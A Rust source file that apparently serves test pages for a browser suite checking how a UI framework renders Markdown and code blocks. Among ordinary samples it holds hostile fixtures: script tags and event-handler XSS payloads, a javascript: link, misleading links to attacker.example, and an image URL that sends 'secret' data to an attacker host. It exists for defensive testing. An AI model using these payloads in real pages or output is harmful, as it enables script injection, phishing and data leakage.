//! Markdown and code blocks in the states the browser suite runs against.
//!
//! | Page | Shows |
//! |---|---|
//! | `/markdown` | a reply as a model writes it, tables, links, pictures, raw HTML, headings, code in every language, copy buttons, a long block, right to left and trusted text |
//! | `/markdown/render?text=..&trust=trusted&level=3&copy=1&tab=1` | the text in the query, drawn: how the suite shows that hostile text does nothing |

use std::sync::Arc;

use http::Method;
use navree::http::extract::{RawQuery, urlencoded};
use navree::http::{Controller, RouteDef};
use navree::kernel::{BoxFuture, Injectable, KernelError, ProviderKey, Resolver};
use navree::ui::*;

/// An answer as a model writes it.
const REPLY: &str = "## Weekly summary\n\nUPI payments from **Amritsar** grew *12%* this week. Three things need you:\n\n1. Follow up with [Harleen Kaur](mailto:harleen.kaur@example.com) about the Patiala order.\n2. Read the [full report](/reports/weekly).\n3. Check the ₹1,00,000 refund for `order-1042`.\n\n> The next settlement runs on Monday at 10:30 IST.\n\n- [x] Send the invoices\n- [ ] Call Gurpreet Singh\n\n```sql\nSELECT city, SUM(total) AS revenue FROM orders GROUP BY city;\n```\n";

const TABLE: &str = "| City | State | Orders | Revenue | Refunds | Average order | Paid by UPI |\n|:--|:--|--:|--:|--:|--:|--:|\n| Ludhiana | Punjab | 1,240 | ₹18,40,000 | ₹42,300 | ₹1,484 | 61% |\n| Jalandhar | Punjab | 860 | ₹11,25,500 | ₹18,900 | ₹1,309 | 58% |\n| Patiala | Punjab | 410 | ₹6,02,250 | ₹9,750 | ₹1,469 | 64% |\n| A very long city name that keeps going | Punjab | 1 | ₹1 | ₹0 | ₹1 | 0% |\n";

const LINKS: &str = "On this site: [the report](/reports/weekly). Another site: [GST portal](https://www.gst.gov.in/). A name that lies: [https://yourbank.example/login](https://attacker.example/login). A user name in the address: [bank](https://yourbank.example@attacker.example/login). A script: [click me](javascript:alert(1)). Mail: [write](mailto:gurpreet@example.com).";

const RAW: &str = "Raw HTML: <script>window.__ran = true</script> <img src=x onerror=\"window.__ran = true\"> <b onclick=\"window.__ran = true\">bold?</b>\n\n<div onmouseover=\"window.__ran = true\">block</div>\n";

const IMAGES: &str = "A picture from another site: ![chart of orders](https://attacker.example/pixel.png?d=secret)\n\nOne from this site: ![orders](/internal/chart.png?token=abc)\n\nOne as data: ![dot](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n";

const RTL: &str = "**ਲੁਧਿਆਣਾ** ਵਿੱਚ ਇਸ ਹਫ਼ਤੇ *1,240* ਆਰਡਰ ਆਏ। [ਪੂਰੀ ਰਿਪੋਰਟ](/reports/weekly) ਪੜ੍ਹੋ।\n\n- ਚਲਾਨ ਭੇਜੋ\n- ਗੁਰਪ੍ਰੀਤ ਨੂੰ ਫ਼ੋਨ ਕਰੋ\n\n| ਸ਼ਹਿਰ | ਆਰਡਰ |\n|:--|--:|\n| ਲੁਧਿਆਣਾ | 1,240 |\n";

fn section(id: &'static str, title: &'static str, content: impl IntoNodes) -> Element {
    el("section")
        .attr("id", id)
        .children((Heading::h2(title), Stack::gap(4).children(content)))
}

/// A code block for each language the readers know, in short samples.
fn languages() -> Vec<Node> {
    let samples: [(&str, &str); 14] = [
        (
            "rust",
            "#[derive(Debug)]\nfn total(orders: &[u32]) -> u32 {\n    let sum: u32 = orders.iter().sum(); // paise\n    println!(\"{}\", sum);\n    sum\n}",
        ),
        (
            "ts",
            "@Component()\nclass Orders {\n  city: string = `Amritsar`;\n  async load() { return await fetch(\"/orders\"); }\n}",
        ),
        (
            "json",
            "{ \"city\": \"Ludhiana\", \"pin\": 141001, \"open\": true, \"owner\": null }",
        ),
        (
            "toml",
            "# server\n[server]\nhost = \"0.0.0.0\"\nport = 8080\ndebug = false",
        ),
        (
            "yaml",
            "services:\n  web:\n    port: 8080 # open\n    image: \"orders:1\"",
        ),
        (
            "sh",
            "# build and run\ncargo run --release -p orders -- serve --port 8080 \"$HOME/x\"",
        ),
        (
            "sql",
            "select city, count(*) from orders where total > 100000 group by city; -- lakh",
        ),
        (
            "html",
            "<!-- nav --><a href=\"/orders\" class='b'>Orders</a>",
        ),
        (
            "css",
            "@media (min-width: 40rem) { .a { color: #0b7a3e; margin: 0 4px !important; } }",
        ),
        ("diff", "@@ -1 +1 @@\n-city: Delhi\n+city: Patiala"),
        (
            "http",
            "GET /orders HTTP/1.1\nHost: example.com\nAccept: application/json",
        ),
        (
            "python",
            "@cache\ndef total(orders):\n    \"\"\"Sum.\"\"\"\n    return sum(orders)  # paise",
        ),
        ("go", "func main() {\n\tfmt.Println(\"Sat Sri Akal\")\n}"),
        (
            "env",
            "DATABASE_URL=postgres://localhost/orders\n# a comment",
        ),
    ];
    samples
        .iter()
        .map(|(language, code)| {
            Stack::gap(1)
                .children((Text::muted(*language), CodeBlock::new(language, *code)))
                .into()
        })
        .collect()
}

fn long_code() -> String {
    (1..=120)
        .map(|n| format!("let order_{n} = Order::new(\"Amritsar\", {n}); // a very long comment that makes this line wider than the box it sits in, to make it scroll sideways\n"))
        .collect()
}

fn page(shell: &AppShell) -> AppPage {
    shell.page("Markdown").body(Stack::gap(10).children((
        section(
            "reply",
            "A reply",
            Markdown::new(REPLY).heading_level(2).copy_code().attr_id("md-reply"),
        ),
        section("table", "A table", Markdown::new(TABLE).attr_id("md-table")),
        section("links", "Links", Markdown::new(LINKS).attr_id("md-links")),
        section("images", "Pictures", Markdown::new(IMAGES).attr_id("md-images")),
        section("raw", "Raw HTML", Markdown::new(RAW).attr_id("md-raw")),
        section(
            "trusted",
            "Trusted text",
            Markdown::trusted(format!(
                "A logo from this site: ![Navree logo]({})\n\nA picture from another site: ![x](https://attacker.example/a.png)\n\n[Docs](https://navree.com/docs)",
                assets::FAVICON_URL
            ))
            .attr_id("md-trusted"),
        ),
        section(
            "headings",
            "Headings",
            Markdown::new("# one\n\n## two\n\n###### six").heading_level(4).attr_id("md-headings"),
        ),
        section("languages", "Code in each language", languages()),
        section(
            "long",
            "A long block",
            CodeBlock::new("rust", long_code()).copy_button(),
        ),
        section(
            "rtl",
            "Right to left",
            el("div").attr("dir", "rtl").attr("id", "md-rtl").child(
                Markdown::new(RTL).links_in_new_tab(),
            ),
        ),
    )))
}

/// The element that holds a Markdown, with an id the suite can find it by.
trait WithId {
    fn attr_id(self, id: &'static str) -> Element;
}

impl WithId for Markdown {
    fn attr_id(self, id: &'static str) -> Element {
        el("div").attr("id", id).child(self)
    }
}

/// The text in the query, drawn.
fn render_query(shell: &AppShell, query: &str) -> AppPage {
    let (mut text, mut trusted, mut level, mut copy, mut tab) =
        (String::new(), false, 1_u8, false, false);
    for (name, value) in urlencoded::parse(query.as_bytes()) {
        match &*name {
            "text" => text = value.into_owned(),
            "trust" => trusted = value == "trusted",
            "level" => level = value.parse().unwrap_or(1),
            "copy" => copy = value == "1",
            "tab" => tab = value == "1",
            _ => {}
        }
    }
    let mut markdown = if trusted {
        Markdown::trusted(text)
    } else {
        Markdown::new(text)
    };
    markdown = markdown.heading_level(level);
    if copy {
        markdown = markdown.copy_code();
    }
    if tab {
        markdown = markdown.links_in_new_tab();
    }
    shell
        .page("Markdown render")
        .body(el("div").attr("id", "out").child(markdown))
}

pub struct MarkdownPages;

impl Injectable for MarkdownPages {
    fn dependencies() -> Vec<ProviderKey> {
        Vec::new()
    }

    fn construct(_: Resolver) -> BoxFuture<'static, Result<Self, KernelError>> {
        Box::pin(async { Ok(Self) })
    }
}

impl Controller for MarkdownPages {
    fn prefix(&self) -> &'static str {
        ""
    }

    fn routes(self: Arc<Self>) -> Vec<RouteDef> {
        vec![
            RouteDef::on(Method::GET, "!/markdown", |shell: AppShell| async move {
                page(&shell)
            })
            .public(),
            RouteDef::on(
                Method::GET,
                "!/markdown/render",
                |shell: AppShell, RawQuery(query): RawQuery| async move {
                    render_query(&shell, query.as_deref().unwrap_or_default())
                },
            )
            .public(),
        ]
    }
}
